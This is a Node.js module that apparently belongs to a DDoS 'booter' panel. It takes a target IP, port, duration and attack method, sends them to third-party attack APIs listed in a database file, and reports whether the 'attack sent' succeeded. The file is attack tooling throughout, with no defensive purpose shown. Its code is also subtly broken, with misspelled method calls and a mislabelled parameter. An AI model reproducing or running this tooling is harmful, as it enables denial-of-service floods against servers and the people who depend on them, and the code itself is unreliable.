const fs = require("fs");
const crud = require("./crud.js");
const config = require("./config");
const f = require("node-fetch");
const boot = require("./boot_management");

/*
THIS HERE WASNT USED BUT WAS THINKING OF A WAY TO MAKE A CONTROL PANEL FOR THIS TO INPUT APIS IN DB AND USE APIS THAT 
INCLUDE THE METHOD USER IS TRYING TO USE
*/

exports.get_apis2boot = function(ip, port, time, host) {
    let db = fs.readFileSync("../db/apis.db", "utf8");
    let apis = db.split("\n");
    apis.forEach(a => {
        if(a.length > 5) {
            let api = a.split("|");
            console.log(api[0]);

            //boot here
        }
    })
}

exports.boot = async info => {
    let split_info = info.split(",");
    let api = split_info[0];
    let ip = split_info[1];
    let port = split_info[2];
    let time = split_info[3];
    let method = split_info[4];
    const req = await f(api + ip + "&port=" + port + "&host=" + time + "&method=" + method);
    const resposne = await req.text();
    if(resposne)
    {
        let filerered_res = boot.filer_response(resposne);
        console.log(filerered_res);
        return filerered_res;
    } else {
        return "Unable to send attack!";
    }
}

exports.filer_response = function(res) {
    if(res.toLowerCase().includes("attack sent")) {
        return "Attack sent!";
    } else if(res.toLowerCase().includes("key is invalid") || res.toLowerCase().include("invalid key")) {
        return "Error, Invalid key";
    } else if(res.toLowerCase().includes("invalid method") || res.toLowerCase().include("method is invalid") || res.toLowerCase().include("method does not exist")) {
        return "Error, Invalid method";
    }
}